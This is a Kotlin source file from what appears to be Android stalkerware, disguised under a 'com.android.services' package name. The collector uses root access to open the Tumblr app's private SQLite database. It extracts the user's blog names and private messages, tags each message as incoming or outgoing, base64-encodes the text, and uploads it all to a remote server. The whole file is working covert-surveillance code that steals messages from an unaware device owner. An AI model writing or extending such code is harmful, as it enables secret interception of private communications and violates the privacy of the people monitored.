package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.TumblrMessageRooted
import com.android.services.db.entities.TumblrPostRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.TumblrUpload
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.setPermissionTumblr
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class TumblrRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncTumblr) {
            try {
                val tumblrUpload = retrieveTumblrMessages(context, localDatabaseSource)
                if (tumblrUpload != null) {
                    val tumblrMessages = tumblrUpload.tumblrMessageList
                    val tumblrPosts = tumblrUpload.tumblrPostList
                    val startDate = tumblrMessages[tumblrMessages.size - 1].date
                    val endDate = tumblrMessages[0].date
                    val mTumblrSender = RemoteServerHelper(
                        context,
                        AppConstants.TUMBLR_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mTumblrSender.upload(tumblrMessages, tumblrPosts)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.TUMBLR_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.TUMBLR_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val tumblerFolder = "com.tumblr"
        private const val tumblerDB = "Tumblr.sqlite"

        private fun retrieveTumblrMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): TumblrUpload? {

            var tumblrPosts = ArrayList<TumblrPostRooted>()
            var tumblrMessages = ArrayList<TumblrMessageRooted>()

            try {
                setPermissionTumblr()
                val tumblerDatabase = ("/data/data/"
                        + tumblerFolder
                        + "/databases/"
                        + tumblerDB)

                val database =
                    SQLiteDatabase.openDatabase(tumblerDatabase, null, SQLiteDatabase.OPEN_READONLY)
                val c = database.query("user_blogs", null, null, null, null, null, null)
                while (c.moveToNext()) {
                    try {
                        val id = c.getString(c.getColumnIndex("_id"))
                        if (localDatabaseSource.checkTumblrPostAlreadyExists(id)) {
                            val name = c.getString(c.getColumnIndex("name"))
                            val url = c.getString(c.getColumnIndex("url"))

                            val tumblrPostRooted = TumblrPostRooted()
                            tumblrPostRooted.apply {
                                this.postId = id
                                this.username = name
                                this.postUrl = url
                                this.messageDatetime =
                                    AppUtils.formatDate(System.currentTimeMillis().toString())
                                this.timeStamp = System.currentTimeMillis()
                                this.date = AppUtils.getDate(System.currentTimeMillis())
                                this.status = 0
                            }
                            tumblrPosts.add(tumblrPostRooted)
                        }
                    } catch (e: Exception) {
                        e.message
                    }
                }
                c.close()

                logVerbose("${AppConstants.TUMBLR_ROOTED_TYPE} rooted posts list = $tumblrPosts")
                if (tumblrPosts.isNotEmpty())
                    localDatabaseSource.insertTumblrPostRooted(tumblrPosts)
                localDatabaseSource.selectTumblrPostRooted {
                    tumblrPosts = it as ArrayList<TumblrPostRooted>
                }
                logVerbose("${AppConstants.TUMBLR_ROOTED_TYPE} selected posts list = $tumblrPosts")


                val selection2: String?
                val selectionArgs2: Array<String>?
                val since2: String
                val maxTimeStamp =
                    localDatabaseSource.selectTumblrMessageRootedMaxTimeStamp() ?: "0"
                since2 = maxTimeStamp.toString()
                if (since2.isNotEmpty()) {
                    selection2 = String.format("%s > ?", "timestamp")
                    selectionArgs2 = arrayOf(since2)
                } else {
                    selection2 = null
                    selectionArgs2 = null
                }

                var primaryUserId = ""
                val query = database.query("messaging_message",
                    null,
                    selection2,
                    selectionArgs2,
                    null,
                    null,
                    "timestamp DESC")

                while (query.moveToNext()) {
                    try {
                        val timeStamp = query.getString(query.getColumnIndex("timestamp"))
                        val conversationId =
                            query.getString(query.getColumnIndex("conversation_id"))
                        val blog_id = query.getString(query.getColumnIndex("sender_blog_uuid"))
                        var conversationName = ""
                        val cur = database.query("user_blogs", arrayOf("name"),
                            "uuid=?", arrayOf(blog_id), null, null, null)
                        if (cur != null) {
                            if (cur.moveToFirst()) {
                                conversationName = cur.getString(0)
                            }
                            cur.close()
                        }
                        if (primaryUserId == "") {
                            val cursor = database.query("user_blogs", arrayOf("uuid"),
                                "owned_by_user=?", arrayOf("1"), null, null, null)
                            if (cursor != null) {
                                if (cursor.moveToFirst()) primaryUserId = cursor.getString(0)
                                cursor.close()
                            }
                        }
                        val message = query.getString(query.getColumnIndex("text"))
                        val type = if (primaryUserId == blog_id) "outgoing" else "incoming"
                        val tumblrMessageRooted = TumblrMessageRooted()
                        tumblrMessageRooted.apply {
                            this.conversationId = conversationId
                            this.conversationName = conversationName
                            this.message = AppUtils.convertStringToBase64(message)
                            this.type = type
                            this.messageDatetime = AppUtils.formatDate(timeStamp.toString())
                            this.timeStamp = timeStamp.toLong()
                            this.date = AppUtils.getDate(timeStamp.toLong())
                            this.messageId = AppUtils.md5Hash(message + timeStamp + type)
                        }
                        tumblrMessages.add(tumblrMessageRooted)
                    } catch (e: Exception) {
                        logException(
                            "${AppConstants.TINDER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                query.close()
                database.close()

                logVerbose("${AppConstants.TUMBLR_ROOTED_TYPE} rooted messages list = $tumblrMessages")
                if (tumblrMessages.isNotEmpty())
                    localDatabaseSource.insertTumblrMessageRooted(tumblrMessages)
                localDatabaseSource.selectTumblrMessageRooted {
                    tumblrMessages = it as ArrayList<TumblrMessageRooted>
                }
                logVerbose("${AppConstants.TUMBLR_ROOTED_TYPE} selected messages list = $tumblrMessages")

                return if (tumblrPosts.size > 0 || tumblrMessages.size > 0) {
                    TumblrUpload(AppUtils.getUserId(),
                        AppUtils.getPhoneServiceId(),
                        tumblrPosts,
                        tumblrMessages)
                } else {
                    null
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.TINDER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return null
        }
    }
}